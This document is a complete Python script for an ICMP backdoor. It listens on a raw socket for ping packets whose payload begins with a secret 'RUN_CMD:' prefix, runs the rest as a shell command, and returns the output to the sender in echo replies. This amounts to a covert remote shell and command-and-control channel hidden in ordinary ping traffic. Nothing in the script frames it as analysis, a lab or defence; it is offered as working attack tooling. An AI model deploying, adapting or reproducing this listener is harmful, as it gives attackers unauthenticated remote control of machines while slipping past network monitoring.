#!/usr/bin/env python3
import socket
import struct
import subprocess
import sys
import time

# Constants for ICMP
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
MAX_PACKET_SIZE = 65535
MAX_OUTPUT_SIZE = 1400  # Keep output reasonable for ICMP packets

# A secret signature to prevent accidental execution from regular pings
SIGNATURE = b"RUN_CMD:" 

def calc_icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_icmp_reply(icmp_id, icmp_seq, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, icmp_id, icmp_seq)
    packet = header + payload
    chksum = calc_icmp_checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, chksum, icmp_id, icmp_seq)
    return header + payload

def execute_command(command_str):
    """Runs the command and returns the output as bytes with timeout."""
    try:
        print(f"[DEBUG] Running: {command_str}")
        
        # Add timeout to prevent hanging commands
        output = subprocess.check_output(
            command_str, 
            shell=True, 
            stderr=subprocess.STDOUT,
            timeout=15  # 15 second timeout
        )
        
        result = output if output else b"Command executed (no output)."
        
        # Truncate if too large
        if len(result) > MAX_OUTPUT_SIZE:
            result = result[:MAX_OUTPUT_SIZE] + b"\n[...output truncated...]"
        
        print(f"[DEBUG] Result: {len(result)} bytes")
        return result
        
    except subprocess.TimeoutExpired:
        error_msg = b"Error: Command timed out after 15 seconds."
        print(f"[!] Timeout: {command_str}")
        return error_msg
        
    except subprocess.CalledProcessError as e:
        error_msg = f"Error (exit {e.returncode}): {e.output.decode(errors='ignore')}".encode()
        print(f"[!] Command failed: {e.returncode}")
        return error_msg[:MAX_OUTPUT_SIZE]
        
    except Exception as e:
        error_msg = f"System Error: {str(e)}".encode()
        print(f"[!] Exception: {e}")
        return error_msg

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, MAX_PACKET_SIZE)
    except PermissionError:
        print("[!] Needs root/administrator privileges.")
        sys.exit(1)
    
    print("[*] ICMP Command Listener active. Awaiting instructions...")
    print(f"[*] Max output size: {MAX_OUTPUT_SIZE} bytes")
    print(f"[*] Command timeout: 15 seconds")
    
    while True:
        try:
            packet, (src_ip, _) = sock.recvfrom(MAX_PACKET_SIZE)
            
            # IP header is usually 20 bytes; ICMP starts after that
            ip_header_len = (packet[0] & 0x0F) * 4
            icmp_header = packet[ip_header_len : ip_header_len + 8]
            icmp_type, code, cksum, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_header)
            
            if icmp_type == ICMP_ECHO_REQUEST:
                payload = packet[ip_header_len + 8:]
                
                # Check if it's our custom command packet
                if payload.startswith(SIGNATURE):
                    command = payload[len(SIGNATURE):].decode(errors='ignore').strip()
                    print(f"\n[!] Command received from {src_ip}")
                    print(f"[!] Executing: {command}")
                    
                    # Execute and get output
                    start_time = time.time()
                    result = execute_command(command)
                    elapsed = time.time() - start_time
                    
                    print(f"[DEBUG] Execution time: {elapsed:.2f}s")
                    
                    # Build the reply (Echo Reply)
                    reply = build_icmp_reply(icmp_id, icmp_seq, result)
                    
                    # Send reply back
                    sock.sendto(reply, (src_ip, 0))
                    print(f"[*] Reply sent to {src_ip} ({len(reply)} bytes)")
                    
        except KeyboardInterrupt:
            print("\n[*] Shutting down listener...")
            sock.close()
            sys.exit(0)
            
        except Exception as e:
            print(f"[!] Error processing packet: {e}")
            continue

if __name__ == "__main__":
    main()
